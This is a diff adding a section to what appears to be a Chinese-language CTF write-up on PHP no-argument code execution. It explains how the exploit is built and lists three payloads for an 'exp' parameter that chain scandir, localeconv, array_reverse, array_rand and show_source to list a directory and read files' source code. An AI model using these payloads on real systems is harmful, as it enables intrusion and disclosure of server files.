@@ -60,5 +60,15 @@ session_id(): 获取到当前的session_id值；
 手动设置cookie中PHPSESSID=flag.php；
 ```
 
+exp构造原理：利用函数名称来表示要查询的语句和文件名，最后采用show\_source查看源码
+
+Payload:
+
+```
+/?exp=print_r(scandir(pos(localeconv())));   //查看该目录下的所有文件
+/?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));    //查看该目录下倒数第二位的文件源代码
+/?exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));  //随机查看该目录下的一个文件的源代码
+```
+
 
 
